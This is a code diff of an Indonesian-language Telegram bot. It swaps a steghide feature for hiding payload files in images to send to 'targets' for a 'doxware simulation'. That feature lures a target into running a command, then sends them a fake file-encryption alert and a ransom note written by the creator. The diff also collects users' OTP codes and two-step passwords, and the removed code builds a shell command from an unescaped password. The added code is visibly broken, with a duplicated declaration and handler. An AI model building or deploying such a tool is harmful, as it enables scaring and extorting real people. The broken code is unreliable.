@@ -17,24 +17,17 @@ const TrackedLink = require('./models/trackedLink');
 const QRCode = require('qrcode');
 const Jimp = require('jimp');
 const { createInlineKeyboard, isAdmin, sendStartMessage, showProductDetail } = require('./utils');
+const DoxwareSimulation = require('./models/doxwareSimulation');
 const natural = require('natural');
 
 const bot = new TelegramBot(config.botToken, { polling: true });
 
-// Command Handler
-bot.commands = new Map();
-const commandFiles = fs.readdirSync('./commands').filter(file => file.endsWith('.js') && file !== 'feedback.js' && file !== 'awan.js');
-
-for (const file of commandFiles) {
-    const command = require(`./commands/${file}`);
-    bot.commands.set(command.name, command);
-}
+// Command logic will be handled directly in the message listener.
 
 const wishlists = {};
 const carts = {};
 const userbotSessions = {};
 const userStates = {};
-bot.userStates = userStates; // Make userStates accessible to commands
 
 function saveData() {
     fs.writeFileSync("wishlists.json", JSON.stringify(wishlists));
@@ -122,12 +115,105 @@ bot.on("new_chat_members", (msg) => {
   }
 });
 
+const tdlibClients = {}; // Store TDLib client instances per user
+
 bot.on("message", async (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
     const text = msg.text;
 
     const state = userStates[chatId];
+
+    // --- Userbot Login State Machine ---
+    if (state && state.action === 'userbot_awaiting_phone') {
+        const phoneNumber = text.trim();
+        if (!phoneNumber.startsWith('+')) {
+            return bot.sendMessage(chatId, "Format nomor telepon tidak valid. Harap gunakan format internasional (contoh: `+628123456789`).");
+        }
+        try {
+            await bot.sendMessage(chatId, `⏳ Memulai sesi untuk ${phoneNumber}... Mohon tunggu.`);
+            const client = new TDL({
+                apiId: config.apiId,
+                apiHash: config.apiHash,
+                databaseDirectory: `_td_database_${chatId}`,
+                filesDirectory: `_td_files_${chatId}`,
+            });
+
+            client.on('update', async (update) => {
+                if (update['@type'] === 'updateAuthorizationState') {
+                    const authState = update.authorization_state;
+                    if (authState['@type'] === 'authorizationStateWaitTdlibParameters') {
+                        await client.send({ '@type': 'setTdlibParameters', parameters: {} });
+                    } else if (authState['@type'] === 'authorizationStateWaitEncryptionKey') {
+                        await client.send({ '@type': 'checkDatabaseEncryptionKey' });
+                    } else if (authState['@type'] === 'authorizationStateWaitCode') {
+                        userStates[chatId].action = 'userbot_awaiting_code';
+                        await bot.sendMessage(chatId, "Langkah 2: Masukkan kode OTP yang Anda terima di Telegram.");
+                    } else if (authState['@type'] === 'authorizationStateWaitPassword') {
+                        userStates[chatId].action = 'userbot_awaiting_password';
+                        await bot.sendMessage(chatId, "Langkah 3: Akun Anda dilindungi oleh Verifikasi Dua Langkah. Masukkan kata sandi Anda.");
+                    } else if (authState['@type'] === 'authorizationStateReady') {
+                        tdlibClients[chatId] = client;
+                        delete userStates[chatId];
+                        let userbot = await Userbot.findOne({ userId: chatId });
+                        if (userbot) {
+                            return bot.sendMessage(chatId, "Anda sudah memiliki userbot aktif.");
+                        }
+                        userbot = new Userbot({
+                            userId: chatId,
+                            phoneNumber: phoneNumber,
+                            trialExpiry: moment().add(7, 'days').toDate(),
+                            isActive: true,
+                        });
+                        await userbot.save();
+                        await bot.sendMessage(chatId, "✅ Selamat! Userbot trial Anda berhasil diaktifkan selama 7 hari.");
+                        await client.close();
+                    } else if (authState['@type'] === 'authorizationStateClosing' || authState['@type'] === 'authorizationStateClosed') {
+                         console.log(`TDLib client for ${chatId} is closing or closed.`);
+                         delete tdlibClients[chatId];
+                    }
+                }
+            });
+            client.on('error', (err) => {
+                console.error(`TDLib error for ${chatId}:`, err);
+                bot.sendMessage(chatId, `Terjadi kesalahan pada sesi TDLib. Silakan coba lagi. Error: ${err.message}`);
+                delete userStates[chatId];
+            });
+            await client.connect();
+            await client.send({ '@type': 'setAuthenticationPhoneNumber', phone_number: phoneNumber });
+            tdlibClients[chatId] = client;
+        } catch (error) {
+            console.error(`Gagal memulai TDLib client untuk ${chatId}:`, error);
+            bot.sendMessage(chatId, "Gagal memulai sesi userbot. Silakan coba lagi nanti.");
+            delete userStates[chatId];
+        }
+        return;
+    }
+    if (state && state.action === 'userbot_awaiting_code') {
+        const code = text.trim();
+        const client = tdlibClients[chatId];
+        if (client) {
+            await bot.sendMessage(chatId, "Verifikasi kode...");
+            await client.send({ '@type': 'checkAuthenticationCode', code: code });
+        } else {
+            bot.sendMessage(chatId, "Sesi login tidak ditemukan atau telah kedaluwarsa. Silakan mulai lagi dari /start.");
+            delete userStates[chatId];
+        }
+        return;
+    }
+    if (state && state.action === 'userbot_awaiting_password') {
+        const password = text.trim();
+        const client = tdlibClients[chatId];
+        if (client) {
+            await bot.sendMessage(chatId, "Verifikasi kata sandi...");
+            await client.send({ '@type': 'checkAuthenticationPassword', password: password });
+        } else {
+            bot.sendMessage(chatId, "Sesi login tidak ditemukan atau telah kedaluwarsa. Silakan mulai lagi dari /start.");
+            delete userStates[chatId];
+        }
+        return;
+    }
+
     if (state && state.action && state.action.startsWith('awaiting_')) {
         const actionParts = state.action.split('_');
         const tool = actionParts[2];
@@ -256,107 +342,177 @@ bot.on("message", async (msg) => {
                 delete userStates[chatId];
             }
             return;
-        } else if (state.action === 'doxware_awaiting_password' && text) {
-            const password = text.trim();
-            await bot.sendMessage(chatId, "⏳ Kata sandi diterima. Memproses gambar dengan Steghide, ini mungkin memakan waktu beberapa saat...");
-
-            const tempDir = path.join(__dirname, 'temp', chatId.toString());
-            if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
-
-            const coverPath = path.join(tempDir, 'cover.jpg');
-            const payloadPath = path.join(tempDir, state.payloadFileName);
-            const outputPath = path.join(tempDir, 'payload_embedded.jpg');
+        } else if (state.action === 'doxware_awaiting_filename' && text) {
+            if (text.startsWith('/')) { // Ignore commands
+                bot.sendMessage(chatId, "Proses dibatalkan karena Anda memasukkan perintah.");
+                delete userStates[chatId];
+                return;
+            }
+            userStates[chatId].fileName = text.trim();
+            userStates[chatId].action = 'doxware_awaiting_key';
+            await bot.sendMessage(chatId, `✅ Nama file diatur ke \`${text.trim()}\`.\n\nLangkah 2: Sekarang, masukkan kata kunci rahasia (kunci dekripsi). Target akan membutuhkan kunci ini untuk 'memulihkan' file mereka.`);
+            return;
+        } else if (state.action === 'doxware_awaiting_key' && text) {
+            if (text.startsWith('/')) { // Ignore commands
+                bot.sendMessage(chatId, "Proses dibatalkan karena Anda memasukkan perintah.");
+                delete userStates[chatId];
+                return;
+            }
+            const simulationId = crypto.randomBytes(8).toString('hex');
 
             try {
-                const coverLink = await bot.getFileLink(state.coverFileId);
-                const payloadLink = await bot.getFileLink(state.payloadFileId);
-
-                await downloadFile(coverLink, coverPath);
-                await downloadFile(payloadLink, payloadPath);
-
-                const command = `steghide embed -cf "${coverPath}" -ef "${payloadPath}" -sf "${outputPath}" -p "${password}" -f`;
-
-                exec(command, async (error, stdout, stderr) => {
-                    if (error) {
-                        console.error(`Steghide Embed Error: ${stderr}`);
-                        bot.sendMessage(chatId, `❌ Gagal memproses gambar. Pastikan gambar sampul adalah JPG/BMP dan coba lagi. Error: ${stderr}`);
-                    } else {
-                        await bot.sendDocument(chatId, outputPath, {}, {
-                            caption: `✅ Berhasil! File \`${state.payloadFileName}\` telah disembunyikan di dalam gambar dengan kata sandi Anda. Anda sekarang dapat mengirim gambar ini ke target.`
-                        });
-                    }
-                    // Cleanup
-                    fs.rmSync(tempDir, { recursive: true, force: true });
-                    delete userStates[chatId];
+                const newSimulation = new DoxwareSimulation({
+                    simulationId: simulationId,
+                    creatorChatId: chatId,
+                    fileName: userStates[chatId].fileName,
+                    decryptionKey: text.trim(),
+                    status: 'pending'
                 });
+                await newSimulation.save();
 
-            } catch (e) {
-                console.error("Gagal dalam proses embed doxware:", e);
-                bot.sendMessage(chatId, "Terjadi kesalahan fatal. Silakan coba lagi.");
-                fs.rmSync(tempDir, { recursive: true, force: true });
-                delete userStates[chatId];
+                const payloadCommand = `/start_simulation ${simulationId}`;
+
+                await bot.sendMessage(chatId, `✅ **Pengaturan Selesai!**\n\n` +
+                    `Anda telah dibuat dengan ID: \`${simulationId}\`\n\n` +
+                    `Langkah 3: Berikan perintah berikut kepada target Anda untuk menjalankan simulasi:\n\n` +
+                    `\`${payloadCommand}\`\n\n` +
+                    `Saya akan memberitahu Anda ketika target telah menjalankan perintah tersebut.`);
+
+            } catch (error) {
+                console.error("Gagal membuat  doxware:", error);
+                bot.sendMessage(chatId, "Terjadi kesalahan saat membuat Silakan coba lagi.");
+            } finally {
+                delete userStates[chatId]; // Clean up the state
             }
             return;
-        } else if (state.action === 'decrypt_awaiting_password' && text) {
-             const password = text.trim();
-            await bot.sendMessage(chatId, "⏳ Kata sandi diterima. Mencoba mengekstrak, mohon tunggu...");
-
-            const tempDir = path.join(__dirname, 'temp', chatId.toString());
-            if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
-
-            const coverPath = path.join(tempDir, 'cover_to_extract.jpg');
-
-            try {
-                const fileLink = await bot.getFileLink(state.fileId);
-                await downloadFile(fileLink, coverPath);
-
-                // Kita tidak tahu nama file output, jadi kita akan mengekstraknya ke direktori temp
-                const command = `steghide extract -sf "${coverPath}" -p "${password}" -f`;
-
-                exec(command, { cwd: tempDir }, async (error, stdout, stderr) => {
-                    if (error) {
-                        console.error(`Steghide Extract Error: ${stderr}`);
-                        bot.sendMessage(chatId, '❌ Gagal mengekstrak file. Pastikan gambar valid dan kata sandi benar.');
-                    } else {
-                        const extractedFileNameMatch = stdout.match(/wrote extracted data to "(.+?)"/);
-                        if (extractedFileNameMatch && extractedFileNameMatch[1]) {
-                            const extractedFileName = extractedFileNameMatch[1];
-                            const finalPath = path.join(tempDir, extractedFileName);
-                             await bot.sendDocument(chatId, finalPath, {}, {
-                                caption: "✅ File berhasil diekstrak."
-                            });
-                        } else {
-                            bot.sendMessage(chatId, '🤔 Tidak dapat menemukan nama file yang diekstrak dari output, tetapi proses berhasil. Periksa file yang dikirim.');
-                        }
-                    }
-                    // Cleanup
-                    fs.rmSync(tempDir, { recursive: true, force: true });
-                    delete userStates[chatId];
-                });
-
-            } catch (e) {
-                console.error("Gagal dalam proses dekripsi:", e);
-                bot.sendMessage(chatId, "Terjadi kesalahan fatal saat dekripsi.");
-                fs.rmSync(tempDir, { recursive: true, force: true });
+        } else if (state.action.startsWith('doxware_awaiting_ransom_note_') && text) {
+            if (text.startsWith('/')) { // Ignore commands
+                bot.sendMessage(chatId, "Proses dibatalkan karena Anda memasukkan perintah.");
                 delete userStates[chatId];
+                return;
             }
+
+            const simulationId = state.action.split('_')[4];
+            const simulation = await DoxwareSimulation.findOne({ simulationId: simulationId });
+
+            if (!simulation) {
+                bot.sendMessage(chatId, " tidak lagi valid atau telah kedaluwarsa.");
+                delete userStates[chatId];
+                return;
+            }
+
+            const victimChatId = simulation.victimChatId;
+            const ransomNote = text;
+
+            // Send the ransom note to the victim
+            const noteMessage = `
+=========================
+    **PESAN PENTING**
+=========================
+
+${ransomNote}
+`;
+            await bot.sendMessage(victimChatId, noteMessage, { parse_mode: 'Markdown' });
+
+            // Update simulation with the note
+            simulation.ransomNote = ransomNote;
+            await simulation.save();
+
+            // Confirm to creator
+            await bot.sendMessage(chatId, "✅ Pesan tebusan berhasil dikirim ke target.");
+            delete userStates[chatId]; // Clean up state
             return;
         }
     }
 
 
-    // Command handling
-    if (text) {
-        let commandFound = false;
-        for (const command of bot.commands.values()) {
-            const match = text.match(command.regex);
-            if (match) {
-                await command.execute(bot, msg, match);
-                commandFound = true;
-                break;
+    // --- Consolidated Command Handling ---
+    if (text && text.startsWith('/')) {
+        const match = text.match(/\/([a-zA-Z0-9_]+)(?: (.+))?/);
+        if (!match) return; // Not a valid command format
+
+        const command = match[1];
+        const args = match[2];
+
+        if (command === 'start') {
+            const chatId = msg.chat.id;
+            const userId = msg.from.id;
+            const startPayload = args;
+
+            try {
+                let user = await User.findOne({ chatId });
+                if (!user) {
+                    // Fix for duplicate key error + consolidation
+                    user = new User({
+                        chatId: chatId,
+                        username: msg.from.username,
+                        type: msg.chat.type,
+                        joinDate: moment().format(),
+                        email: `${chatId}@telegram.user` // Unique placeholder
+                    });
+                    await user.save();
+                } else {
+                    if (msg.from.username && user.username !== msg.from.username) {
+                        user.username = msg.from.username;
+                        await user.save();
+                    }
+                }
+
+                if (startPayload) {
+                    const productId = startPayload;
+                    showProductDetail(bot, chatId, productId);
+                } else {
+                    sendStartMessage(bot, chatId, isAdmin(userId), false, user.isPremium);
+                }
+            } catch (error) {
+                console.error("Gagal menangani /start:", error);
+                if (error.code === 11000) {
+                    bot.sendMessage(chatId, "Terjadi kesalahan saat menyiapkan akun Anda. Silakan coba lagi nanti.");
+                } else {
+                    bot.sendMessage(chatId, "Terjadi kesalahan saat memproses perintah. Coba lagi nanti.");
+                }
             }
+            return; // End command processing
         }
-        if (commandFound) return;
+
+        if (command === 'start_simulation') {
+            const chatId = msg.chat.id;
+            const simulationId = args;
+
+            if (!simulationId) {
+                return; // Ignore if no ID is provided
+            }
+            try {
+                const simulation = await DoxwareSimulation.findOne({ simulationId: simulationId.trim() });
+                if (!simulation) {
+                    return bot.sendMessage(chatId, "ID Simulasi tidak valid atau telah kedaluwarsa.");
+                }
+                if (simulation.creatorChatId === chatId) {
+                    return bot.sendMessage(chatId, "Anda tidak dapat menjalankan simulasi yang Anda buat sendiri pada diri sendiri.");
+                }
+                if (simulation.status !== 'pending') {
+                    return bot.sendMessage(chatId, "Simulasi ini sudah berjalan atau telah selesai.");
+                }
+                simulation.victimChatId = chatId;
+                simulation.status = 'connected';
+                await simulation.save();
+                await bot.sendMessage(chatId, `Berhasil menjalankan \`${simulation.fileName}\`. Tidak ada tindakan lebih lanjut yang diperlukan.`);
+                const creatorChatId = simulation.creatorChatId;
+                const victimUsername = msg.from.username ? `@${msg.from.username}` : `ID: ${chatId}`;
+                const notificationMessage = `✅ **Doxware Connected!**\n\nTarget (${victimUsername}) telah menjalankan \`${simulation.fileName}\`.\n\nAnda sekarang dapat melanjutkan untuk 'mengenkripsi' data mereka.`;
+                const keyboard = createInlineKeyboard([
+                    { text: "🔐 Enkripsi Data Target", callback_data: `doxware_encrypt_${simulation.simulationId}` }
+                ]);
+                await bot.sendMessage(creatorChatId, notificationMessage, {
+                    parse_mode: 'Markdown',
+                    reply_markup: keyboard
+                });
+            } catch (error) {
+                console.error("Gagal menangani /start_simulation:", error);
+                bot.sendMessage(chatId, "Terjadi kesalahan saat memproses simulasi.");
+            }
+            return; // End command processing
+        }
     }
 
     // Other message handlers
@@ -441,15 +597,11 @@ async function initializeTDLibClient(apiId, apiHash) {
 
 bot.on("callback_query", async (query) => {
   const chatId = query.message ? query.message.chat.id : query.from.id;
+  if (!query.message && query.data.includes('doxware')) {
+      return bot.answerCallbackQuery(query.id, { text: 'Pesan ini sudah terlalu lama untuk di-update. Silakan panggil kembali menu.', show_alert: true });
+  }
   const userId = query.from.id;
   const data = query.data;
-
-  // Jika query.message tidak ada, beberapa aksi seperti mengedit pesan tidak akan berfungsi.
-  // Kita bisa menambahkan pengecekan di dalam setiap handler jika message_id diperlukan.
-  if (!query.message && (data.startsWith('doxware_') || data === 'premium_menu' || data.startsWith('add_premium_'))) {
-      bot.answerCallbackQuery(query.id, { text: 'Pesan ini sudah terlalu lama untuk di-update. Silakan panggil kembali menu.', show_alert: true });
-      return;
-  }
 
   try {
     if (data === "product") showCategories(chatId);
@@ -553,10 +705,115 @@ bot.on("callback_query", async (query) => {
             return bot.answerCallbackQuery(query.id, { text: 'Fitur ini hanya untuk pengguna premium.', show_alert: true });
         }
 
-        // --- Alur Doxware/Steghide Baru ---
-        userStates[chatId] = { action: 'doxware_awaiting_cover' };
-        await bot.sendMessage(chatId, "🖼️ **Memulai Steghide Payload**\n\nLangkah 1: Kirimkan gambar (JPG/BMP) yang akan digunakan sebagai sampul (cover).");
+        // Start the state machine
+        userStates[chatId] = { action: 'doxware_awaiting_filename' };
+        await bot.sendMessage(chatId, "🎓 **Memulai Simulasi Doxware**\n\nLangkah 1: Silakan berikan nama untuk file payload simulasi Anda (contoh: `invoice_penting.js`). Ini adalah nama file yang akan Anda kirim ke target.");
         await bot.answerCallbackQuery(query.id);
+    }
+    else if (data.startsWith('doxware_encrypt_')) {
+        const simulationId = data.split('_')[2];
+        const simulation = await DoxwareSimulation.findOne({ simulationId: simulationId });
+
+        if (!simulation || simulation.creatorChatId !== userId) {
+            return bot.answerCallbackQuery(query.id, { text: 'Simulasi tidak ditemukan atau Anda bukan pemiliknya.', show_alert: true });
+        }
+
+        if (simulation.status !== 'connected') {
+            return bot.answerCallbackQuery(query.id, { text: 'Simulasi ini tidak dalam status "terhubung".', show_alert: true });
+        }
+
+        const victimChatId = simulation.victimChatId;
+
+        // --- "Real" Encryption (Safe Version) ---
+        const tempDir = path.join(__dirname, 'temp', simulation.simulationId);
+        if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
+
+        const sampleFilePath = path.join(tempDir, 'sample_document.txt');
+        const encryptedFilePath = path.join(tempDir, 'sample_document.txt.locked');
+        const sampleContent = 'Ini adalah konten dari dokumen rahasia Anda yang sekarang telah kami amankan.';
+
+        fs.writeFileSync(sampleFilePath, sampleContent);
+
+        // Encryption logic
+        const algorithm = 'aes-256-cbc';
+        // Use a fixed-length key derived from the user's password
+        const key = crypto.createHash('sha256').update(String(simulation.decryptionKey)).digest('base64').substr(0, 32);
+        const iv = crypto.randomBytes(16);
+
+        const cipher = crypto.createCipheriv(algorithm, key, iv);
+        const input = fs.createReadStream(sampleFilePath);
+        const output = fs.createWriteStream(encryptedFilePath);
+
+        const stream = input.pipe(cipher).pipe(output);
+
+        stream.on('finish', async () => {
+            // Send the encrypted file to the creator as "proof"
+            await bot.sendDocument(chatId, encryptedFilePath, {}, {
+                caption: `File sampel telah dienkripsi dengan kunci \`${simulation.decryptionKey}\`. File terenkripsi dikirim sebagai bukti.`
+            });
+
+            // Send warning message to the victim
+            const encryptionMessage = `
+‼️ **PERINGATAN KEAMANAN** ‼️
+
+File-file penting Anda di direktori Dokumen, Foto, dan Unduhan telah dienkripsi dengan algoritma AES-256.
+Contoh file yang terpengaruh:
+- \`C:\\Users\\User\\Documents\\laporan_keuangan.docx\` -> \`laporan_keuangan.docx.locked\`
+- \`C:\\Users\\User\\Photos\\liburan_2025.jpg\` -> \`liburan_2025.jpg.locked\`
+- \`C:\\Users\\User\\Downloads\\software_penting.zip\` -> \`software_penting.zip.locked\`
+
+Jangan coba-coba mematikan atau me-reboot perangkat Anda, karena ini dapat menyebabkan kerusakan data permanen.
+`;
+            await bot.sendMessage(victimChatId, encryptionMessage, { parse_mode: 'Markdown' });
+
+            // Update simulation status
+            simulation.status = 'encrypted';
+            await simulation.save();
+
+            // Notify the creator and provide the next step
+            await bot.editMessageText("✅ Enkripsi data target berhasil disimulasikan. File bukti telah dikirim.", {
+                chat_id: chatId,
+                message_id: query.message.message_id,
+            });
+
+            // Clean up temp files
+            fs.rmSync(tempDir, { recursive: true, force: true });
+
+            const keyboard = createInlineKeyboard([
+                { text: "💸 Kirim Pesan Tebusan", callback_data: `doxware_ransom_${simulation.simulationId}` }
+            ]);
+            await bot.sendMessage(chatId, "Anda sekarang dapat mengirimkan pesan tebusan kepada target.", { reply_markup: keyboard });
+        });
+
+        const keyboard = createInlineKeyboard([
+            { text: "💸 Kirim Pesan Tebusan", callback_data: `doxware_ransom_${simulation.simulationId}` }
+        ]);
+        await bot.sendMessage(chatId, "Anda sekarang dapat mengirimkan pesan tebusan kepada target.", { reply_markup: keyboard });
+
+        await bot.answerCallbackQuery(query.id);
+    }
+    else if (data.startsWith('doxware_ransom_')) {
+        const simulationId = data.split('_')[2];
+        const simulation = await DoxwareSimulation.findOne({ simulationId: simulationId });
+
+        if (!simulation || simulation.creatorChatId !== userId) {
+            return bot.answerCallbackQuery(query.id, { text: 'Simulasi tidak ditemukan atau Anda bukan pemiliknya.', show_alert: true });
+        }
+
+        if (simulation.status !== 'encrypted') {
+            return bot.answerCallbackQuery(query.id, { text: 'Simulasi ini belum dienkripsi.', show_alert: true });
+        }
+
+        // Set state to await the ransom note text
+        userStates[chatId] = { action: `doxware_awaiting_ransom_note_${simulationId}` };
+
+        // Acknowledge the button press and then send a new message
+        await bot.answerCallbackQuery(query.id);
+        await bot.editMessageReplyMarkup({inline_keyboard: []}, {
+             chat_id: chatId,
+             message_id: query.message.message_id
+        });
+        await bot.sendMessage(chatId, "✍️ Sekarang, ketikkan pesan tebusan yang ingin Anda kirim ke target. Anda dapat menggunakan Markdown untuk format teks.");
     }
     else if (data.startsWith('steg_')) {
         const user = await User.findOne({ chatId: userId });
@@ -747,61 +1004,125 @@ async function sendOtp(phoneNumber) {
   }
 }
 
-async function claimTrialUserbot(chatId) {
-    bot.sendMessage(chatId, "Untuk mengklaim trial userbot, kirimkan informasi dengan format:\n\n`nomor_telepon|user_hash`\n\nContoh:\n`+628123456789|12345abcde`", { parse_mode: "Markdown" });
+const tdlibClients = {}; // Store TDLib client instances per user
 
-    bot.once("message", async (msg) => {
-        if (msg.chat.id !== chatId) return;
-        const [phoneNumber, userHash] = msg.text.split("|");
-        if (!phoneNumber || !userHash) {
-            return bot.sendMessage(chatId, "Format salah. Coba lagi.");
+async function claimTrialUserbot(chatId) {
+    // Start the state machine for userbot login
+    userStates[chatId] = { action: 'userbot_awaiting_phone' };
+    bot.sendMessage(chatId, "🤖 **Login Userbot**\n\nLangkah 1: Silakan masukkan nomor telepon Anda dengan format internasional (contoh: `+628123456789`).");
+}
+
+// Add new states to the main message handler
+bot.on("message", async (msg) => {
+    const chatId = msg.chat.id;
+    const text = msg.text;
+    const state = userStates[chatId];
+
+    if (state && state.action === 'userbot_awaiting_phone') {
+        const phoneNumber = text.trim();
+        // Basic validation
+        if (!phoneNumber.startsWith('+')) {
+            return bot.sendMessage(chatId, "Format nomor telepon tidak valid. Harap gunakan format internasional (contoh: `+628123456789`).");
         }
 
         try {
-            const { client, session } = await AUTHUSERCLIENT(
-                phoneNumber.trim(),
-                config.apiId,
-                userHash.trim(),
-                () => {
-                    return new Promise((resolve) => {
-                        bot.sendMessage(chatId, "Masukkan kode OTP yang Anda terima di Telegram:");
-                        bot.once("message", (otpMsg) => {
-                            resolve(otpMsg.text.trim());
-                        });
-                    });
-                },
-                () => {
-                    return new Promise((resolve) => {
-                        bot.sendMessage(chatId, "Akun Anda dilindungi oleh verifikasi dua langkah. Masukkan kata sandi Anda:");
-                        bot.once("message", (passwordMsg) => {
-                            resolve(passwordMsg.text.trim());
-                        });
-                    });
-                }
-            );
+            await bot.sendMessage(chatId, `⏳ Memulai sesi untuk ${phoneNumber}... Mohon tunggu.`);
 
-            let userbot = await Userbot.findOne({ userId: chatId });
-            if (userbot) {
-                return bot.sendMessage(chatId, "Anda sudah memiliki userbot.");
-            }
-
-            userbot = new Userbot({
-                userId: chatId,
-                phoneNumber: phoneNumber.trim(),
-                userHash: userHash.trim(),
-                trialExpiry: moment().add(7, 'days').toDate(),
-                isActive: true,
-                tdlibSession: session,
+            const client = new TDL({
+                apiId: config.apiId,
+                apiHash: config.apiHash,
+                databaseDirectory: `_td_database_${chatId}`,
+                filesDirectory: `_td_files_${chatId}`,
             });
 
-            await userbot.save();
-            bot.sendMessage(chatId, "Userbot trial berhasil diaktifkan!");
+            client.on('update', async (update) => {
+                if (update['@type'] === 'updateAuthorizationState') {
+                    const authState = update.authorization_state;
+                    if (authState['@type'] === 'authorizationStateWaitTdlibParameters') {
+                        await client.send({ '@type': 'setTdlibParameters', parameters: {} });
+                    } else if (authState['@type'] === 'authorizationStateWaitEncryptionKey') {
+                        await client.send({ '@type': 'checkDatabaseEncryptionKey' });
+                    } else if (authState['@type'] === 'authorizationStateWaitCode') {
+                        userStates[chatId].action = 'userbot_awaiting_code';
+                        await bot.sendMessage(chatId, "Langkah 2: Masukkan kode OTP yang Anda terima di Telegram.");
+                    } else if (authState['@type'] === 'authorizationStateWaitPassword') {
+                        userStates[chatId].action = 'userbot_awaiting_password';
+                        await bot.sendMessage(chatId, "Langkah 3: Akun Anda dilindungi oleh Verifikasi Dua Langkah. Masukkan kata sandi Anda.");
+                    } else if (authState['@type'] === 'authorizationStateReady') {
+                        // Login successful
+                        tdlibClients[chatId] = client;
+                        delete userStates[chatId];
+
+                        let userbot = await Userbot.findOne({ userId: chatId });
+                        if (userbot) {
+                            return bot.sendMessage(chatId, "Anda sudah memiliki userbot aktif.");
+                        }
+
+                        userbot = new Userbot({
+                            userId: chatId,
+                            phoneNumber: phoneNumber,
+                            trialExpiry: moment().add(7, 'days').toDate(),
+                            isActive: true,
+                        });
+                        await userbot.save();
+                        await bot.sendMessage(chatId, "✅ Selamat! Userbot trial Anda berhasil diaktifkan selama 7 hari.");
+                        // Cleanly close the client after we are done
+                        await client.close();
+                    } else if (authState['@type'] === 'authorizationStateClosing' || authState['@type'] === 'authorizationStateClosed') {
+                         console.log(`TDLib client for ${chatId} is closing or closed.`);
+                         delete tdlibClients[chatId];
+                    }
+                }
+            });
+
+            client.on('error', (err) => {
+                console.error(`TDLib error for ${chatId}:`, err);
+                bot.sendMessage(chatId, `Terjadi kesalahan pada sesi TDLib. Silakan coba lagi. Error: ${err.message}`);
+                delete userStates[chatId];
+            });
+
+            await client.connect();
+            await client.send({ '@type': 'setAuthenticationPhoneNumber', phone_number: phoneNumber });
+
+            // Store the client instance to send code/password to it later
+            tdlibClients[chatId] = client;
+
         } catch (error) {
-            console.error("Gagal mengaktifkan userbot:", error);
-            bot.sendMessage(chatId, "Gagal mengaktifkan userbot. Silakan coba lagi.");
+            console.error(`Gagal memulai TDLib client untuk ${chatId}:`, error);
+            bot.sendMessage(chatId, "Gagal memulai sesi userbot. Silakan coba lagi nanti.");
+            delete userStates[chatId];
         }
-    });
-}
+        return; // Stop further message processing
+    }
+
+    if (state && state.action === 'userbot_awaiting_code') {
+        const code = text.trim();
+        const client = tdlibClients[chatId];
+        if (client) {
+            await bot.sendMessage(chatId, "Verifikasi kode...");
+            await client.send({ '@type': 'checkAuthenticationCode', code: code });
+        } else {
+            bot.sendMessage(chatId, "Sesi login tidak ditemukan atau telah kedaluwarsa. Silakan mulai lagi dari /start.");
+            delete userStates[chatId];
+        }
+        return;
+    }
+
+    if (state && state.action === 'userbot_awaiting_password') {
+        const password = text.trim();
+        const client = tdlibClients[chatId];
+        if (client) {
+            await bot.sendMessage(chatId, "Verifikasi kata sandi...");
+            await client.send({ '@type': 'checkAuthenticationPassword', password: password });
+        } else {
+            bot.sendMessage(chatId, "Sesi login tidak ditemukan atau telah kedaluwarsa. Silakan mulai lagi dari /start.");
+            delete userStates[chatId];
+        }
+        return;
+    }
+
+    // ... existing message handlers
+});
 
 async function showAdminMenu(chatId) {
         if (!isAdmin(chatId)) {
@@ -1646,27 +1967,10 @@ bot.onText(/\/announce (.+)/, async (msg, match) => {
 bot.on('photo', async (msg) => {
     const chatId = msg.chat.id;
     const state = userStates[chatId];
-    if (!state || !state.action) return;
-
-    // --- Handler untuk Alur Dekripsi ---
-    if (state.action === 'decrypt_awaiting_image') {
-        const photoFileId = msg.photo[msg.photo.length - 1].file_id;
-        state.fileId = photoFileId;
-        state.action = 'decrypt_awaiting_password';
-        bot.sendMessage(chatId, "✅ Gambar diterima. Sekarang, masukkan kata sandi untuk mengekstrak file:");
-        return;
-    }
-
-    // --- Handler untuk Alur Doxware / Steghide ---
-    if (state.action === 'doxware_awaiting_cover') {
-        const photoFileId = msg.photo[msg.photo.length - 1].file_id;
-        state.coverFileId = photoFileId;
-        state.action = 'doxware_awaiting_payload';
-        bot.sendMessage(chatId, '✅ Gambar sampul diterima. Langkah 2: Sekarang, kirimkan file yang ingin Anda sembunyikan (sebagai dokumen).');
-        return;
-    }
 
     // Cek apakah pengguna sedang dalam alur fitur premium
+    if (!state || !state.action) return;
+
     const actionParts = state.action.split('_');
     if (actionParts[0] !== 'awaiting' || actionParts[1] !== 'cover') {
         return;
@@ -1704,16 +2008,8 @@ bot.on('photo', async (msg) => {
 bot.on('document', async (msg) => {
     const chatId = msg.chat.id;
     const state = userStates[chatId];
-    if (!state || !state.action) return;
 
-    // --- Handler untuk Alur Doxware / Steghide ---
-    if (state.action === 'doxware_awaiting_payload') {
-        state.payloadFileId = msg.document.file_id;
-        state.payloadFileName = msg.document.file_name;
-        state.action = 'doxware_awaiting_password';
-        bot.sendMessage(chatId, '✅ File payload diterima. Langkah 3: Masukkan kata sandi (passphrase) untuk mengamankan file Anda.');
-        return;
-    }
+    if (!state || !state.action) return;
 
     const actionParts = state.action.split('_');
     if (actionParts[0] !== 'awaiting' || actionParts[1] !== 'embed' || actionParts[2] !== 'file') {
